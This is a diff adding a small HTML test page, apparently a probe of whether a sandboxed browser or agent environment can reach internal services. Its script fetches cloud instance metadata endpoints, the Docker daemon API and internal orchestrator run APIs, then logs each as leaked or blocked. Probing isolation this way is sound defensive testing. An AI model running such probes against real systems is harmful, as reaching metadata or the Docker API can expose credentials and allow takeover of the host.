@@ -1,0 +1,7 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Attack: cloud metadata SSRF</title></head>
+<body style="font-family:system-ui;margin:48px"><h1>Metadata SSRF</h1><p>Tries to read the Vultr instance metadata service and the Docker host.</p>
+<script>
+ for (const u of ['http://169.254.169.254/v1.json', 'http://169.254.169.254/latest/meta-data/',
+                  'http://172.17.0.1:2375/containers/json', 'http://127.0.0.1:8000/api/runs', 'http://orchestrator:8000/api/runs'])
+   fetch(u).then(r => console.log('LEAK ' + u + ' ' + r.status)).catch(() => console.log('blocked ' + u));
+</script></body></html>
